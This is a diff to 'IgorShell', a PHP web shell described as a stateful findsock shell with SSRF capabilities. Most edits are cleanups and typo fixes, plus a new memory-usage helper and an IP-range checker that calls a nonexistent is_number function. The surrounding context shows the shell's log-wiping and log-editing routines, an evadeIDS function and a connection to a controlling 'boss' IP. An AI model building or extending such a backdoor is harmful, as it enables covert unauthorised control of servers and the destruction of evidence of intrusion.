@@ -4,7 +4,7 @@
  *    IgorShell, findsock php statefull shell with ssrf capabilities.
  *    Author: Captain, Mantis
  *    Date: 05-08-2013
- *    Dependancies: PHP >= 5.3.6
+ *    Dependencies: PHP >= 5.3.6
  */
 
 // Disable timing out as we wish to facilitate a statefull shell session.
@@ -18,15 +18,15 @@ class IgorShell {
 
     private $m_Shell = '/bin/sh';
 
-    private $m_Pid;
-    private $m_Nice;
-    private $m_FileDescriptors;
-    private $m_BossIp;
-    private $m_BossPort;
-    private $m_BossSock;
-    private $m_TimeStart;
-    private $m_TimeEnd;
-
+    private $m_Pid,
+            $m_Nice,
+            $m_FileDescriptors,
+            $m_BossIp,
+            $m_BossPort,
+            $m_BossSock,
+            $m_TimeStart,
+            $m_TimeEnd,
+            $m_localOs = PHP_OS;
 
     public function __construct() {
         $this->m_Pid             = getmypid();
@@ -55,7 +55,10 @@ class IgorShell {
         preg_match ('/^\s*\w+\s+\w+\s*(\d+)\s+(\d+)/m', $res, $matches);
 
         // Return Pid and priority
-        return array ( 'pid' => (isset ($matches[1]) ? $matches[1] : null), 'nice' => (isset ($matches[2]) ? $matches[2] : null) );
+        return array (
+            'pid' => (isset ($matches[1]) ? $matches[1] : null),
+            'nice' => (isset ($matches[2]) ? $matches[2] : null),
+        );
     }
 
     /**
@@ -66,6 +69,11 @@ class IgorShell {
     private function getFileDescriptors(  ) {
 
         $it = new DirectoryIterator("glob:///proc/self/fd/*");
+        /**
+         //
+         // -- This code is here because I need to finish writing an implementation for non-linux operating systems
+         //
+         */
         // $x = `lsof`;
         // $return = array();
         // if($b = preg_split('/(\t|\s)+/', $x)){
@@ -112,16 +120,18 @@ class IgorShell {
         echo "<hr/>".print_r($this->m_FileDescriptors, true).'<br/>';
     }
 
-    public function whipeLog( $fd = null ) {
+    public function wipeLog( $fd = null ) {
 
         // Default fd for log. If NULL ,retrieve logfiles from internal file descripters.
         if( $fd == null ){
             $logfiles = $this->getLogFiles();
-        }else{
+        } else {
             $logfiles[] = $fd;
         }
         foreach($logfiles as $key => $props){
-            if(!is_resource($props['fd'])) continue;
+            if(!is_resource($props['fd'])) {
+                continue;
+            }
 
             // Fetch log size before whiping so we can check if the operation is successfull later on
             $prevSize = strlen( stream_get_contents($props['fd']) );
@@ -141,7 +151,6 @@ class IgorShell {
                     }
                 }
             }
-
             fclose($props['fd']);
         }
     }
@@ -164,6 +173,8 @@ class IgorShell {
      *    Method that reads contents of log file referenced by fd
      *    performs some basic manipulations on the data and
      *    overwrites the log with manipulated version.
+     *
+     *    @todo : Finish this function
      */
     private function editLog( $fd = null ) {
         $this->m_TimeEnd = time();
@@ -282,7 +293,9 @@ class IgorShell {
             sleep(1000);
         }
     }
-
+    /**
+     * @todo : finish off this function
+     */
     public function evadeIDS($arg, $count = false){
         switch(strtolower(gettype($arg))){
             case 'string':
@@ -364,6 +377,91 @@ class IgorShell {
             $password .= $character;
         }
         return $password;
+    }
+
+    protected function memoryUsage($info = null, $nl = '<br />') {
+        static $start_code_line = 0;
+        static $memoryUsage = array();
+
+        $start_time = time();
+
+        $debug     = debug_backtrace();
+        $call_info = array_shift($debug);
+        $code_line = $call_info['line'];
+        $file      = explode((stristr(PHP_OS, 'WIN') ? '\\' : '/'), $call_info['file']);
+        $file      = array_pop($file);
+
+        if ($start_time === null) {
+            print 'debug ['.($info === null ? null : $info).']<strong>'.$file.'</strong>> init'.$nl;
+            $start_time = time() + microtime();
+            $start_code_line = $code_line;
+            return 0;
+        }
+
+        $memoryUsage[] = array(
+            'info'        => ($info === null ? null : $info),
+            'file_exec'   => $file,
+            'start_exec'  => $start_code_line,
+            'end_exec'    => $code_line,
+            'time_exec'   => round(time() + microtime() - $start_time, 4),
+            'memory_exec' => memory_get_usage()
+        );
+
+        $start_time = time() + microtime();
+        $start_code_line = $code_line;
+
+        return $memoryUsage;
+    }
+    /**
+     * Verifies an IP against a IPv4 range.
+     *         127.0.0.1 would verify against 127.0.0.* but not *.*.*.2
+     */
+    public function checkIPRange($range, $ip){
+        $range = explode('.', $range);
+        $ip = explode('.', $ip);
+
+        // Make sure the IP is valid under IPv4
+        if(count($range) > 4 || count($ip) > 4){
+            return false;
+        }
+
+        if($range[0] == '*' || $ip[0] == '*'){
+            return false;
+        }
+
+        for($i=0;$i<4;$i++){
+            // Make sure the SubMask is valid under IPv4
+            if(strlen($range[$i]) > 3 || strlen($ip[$i]) > 3){
+                return false;
+            }
+
+            // Make sure the SubMask is valid
+            if(!is_number($range[$i]) && $range[$i] != '*'){
+                return false;
+            }
+
+            // Make sure the SubMask is valid
+            if(!is_number($ip[$i]) && $ip[$i] != '*'){
+                return false;
+            }
+
+            // Make sure the SubMask is valid
+            if(is_number($range[$i]) && strlen($range[$i]) > 255){
+                return false;
+            }
+
+            // Make sure the SubMask is valid
+            if(is_number($ip[$i]) && strlen($ip[$i]) > 255){
+                return false;
+            }
+
+            // Final Check
+            if($range[$i] != $ip[$i] && $range[$i] != '*'){
+                return false;
+            }
+        }
+
+        return true;
     }
 }
 
